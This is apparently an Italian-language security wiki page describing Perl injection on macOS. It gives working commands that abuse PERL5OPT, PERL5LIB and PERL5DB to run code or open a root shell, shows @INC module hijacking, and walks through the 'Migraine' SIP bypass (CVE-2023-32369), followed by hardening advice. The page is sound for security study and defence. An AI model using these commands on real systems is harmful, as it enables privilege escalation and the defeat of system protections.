# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Utilizzando la variabile d'ambiente **`PERL5OPT`** è possibile far eseguire a **Perl** comandi arbitrari quando l'interprete si avvia (anche **prima** che la prima riga dello script di destinazione venga analizzata).
Ad esempio, crea questo script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Ora **esporta la variabile di ambiente** ed esegui lo **script perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Un'altra opzione è creare un modulo Perl (ad es. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
E poi usa le variabili di ambiente in modo che il modulo venga localizzato e caricato automaticamente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Altre variabili d'ambiente interessanti

* **`PERL5DB`** – quando l'interprete viene avviato con il flag **`-d`** (debugger), il contenuto di `PERL5DB` viene eseguito come codice Perl *all'interno* del contesto del debugger. Se puoi influenzare sia l'ambiente **che** i flag della riga di comando di un processo Perl privilegiato, puoi fare qualcosa del genere:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # aprirà una shell prima di eseguire lo script
```

* **`PERL5SHELL`** – su Windows questa variabile controlla quale eseguibile della shell Perl utilizzerà quando deve avviare una shell. Viene menzionata qui solo per completezza, poiché non è rilevante su macOS.

Sebbene `PERL5DB` richieda l'opzione `-d`, è comune trovare script di manutenzione o di installazione che vengono eseguiti come *root* con questo flag abilitato per la risoluzione dei problemi dettagliata, rendendo la variabile un vettore di escalation valido.

## Via dipendenze (@INC abuse)

È possibile elencare il percorso di inclusione che Perl cercherà (**`@INC`**) eseguendo:
```bash
perl -e 'print join("\n", @INC)'
```
L'output tipico su macOS 13/14 appare come:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Alcune delle cartelle restituite non esistono nemmeno, tuttavia **`/Library/Perl/5.30`** esiste, *non* è protetta da SIP ed è *prima* delle cartelle protette da SIP. Pertanto, se puoi scrivere come *root* puoi inserire un modulo malevolo (ad es. `File/Basename.pm`) che sarà *preferenzialmente* caricato da qualsiasi script privilegiato che importa quel modulo.

> [!WARNING]
> Hai ancora bisogno di **root** per scrivere all'interno di `/Library/Perl` e macOS mostrerà un prompt **TCC** che chiede *Accesso completo al disco* per il processo che esegue l'operazione di scrittura.

Ad esempio, se uno script importa **`use File::Basename;`** sarebbe possibile creare `/Library/Perl/5.30/File/Basename.pm` contenente codice controllato dall'attaccante.

## Bypass di SIP tramite Migration Assistant (CVE-2023-32369 “Migraine”)

Nel maggio 2023 Microsoft ha divulgato **CVE-2023-32369**, soprannominato **Migraine**, una tecnica di post-exploitation che consente a un attaccante *root* di **bypassare completamente la Protezione dell'integrità di sistema (SIP)**. 
Il componente vulnerabile è **`systemmigrationd`**, un demone dotato di **`com.apple.rootless.install.heritable`**. Qualsiasi processo figlio generato da questo demone eredita il diritto e quindi viene eseguito **al di fuori** delle restrizioni SIP.

Tra i figli identificati dai ricercatori c'è l'interprete firmato da Apple:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perché Perl onora `PERL5OPT` (e Bash onora `BASH_ENV`), avvelenare l'*ambiente* del demone è sufficiente per ottenere un'esecuzione arbitraria in un contesto senza SIP:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Quando `migrateLocalKDC` viene eseguito, `/usr/bin/perl` si avvia con il malevolo `PERL5OPT` ed esegue `/private/tmp/migraine.sh` *prima che SIP venga riabilitato*. Da quel script puoi, ad esempio, copiare un payload all'interno di **`/System/Library/LaunchDaemons`** o assegnare l'attributo esteso `com.apple.rootless` per rendere un file **non eliminabile**.

Apple ha risolto il problema in macOS **Ventura 13.4**, **Monterey 12.6.6** e **Big Sur 11.7.7**, ma i sistemi più vecchi o non patchati rimangono sfruttabili.

## Raccomandazioni per il rafforzamento

1. **Pulisci le variabili pericolose** – i launchdaemons privilegiati o i cron job dovrebbero avviarsi con un ambiente pulito (`launchctl unsetenv PERL5OPT`, `env -i`, ecc.).
2. **Evita di eseguire interpreti come root** a meno che non sia strettamente necessario. Usa binari compilati o riduci i privilegi presto.
3. **Fornisci script con `-T` (modalità taint)** in modo che Perl ignori `PERL5OPT` e altri switch non sicuri quando il controllo di taint è abilitato.
4. **Tieni macOS aggiornato** – “Migraine” è completamente patchato nelle versioni attuali.

## Riferimenti

- Microsoft Security Blog – “Nuova vulnerabilità macOS, Migraine, potrebbe bypassare la Protezione dell'Integrità di Sistema” (CVE-2023-32369), 30 maggio 2023.
- Hackyboiz – “Ricerca sul bypass SIP di macOS (PERL5OPT & BASH_ENV)”, maggio 2025.

{{#include ../../../banners/hacktricks-training.md}}
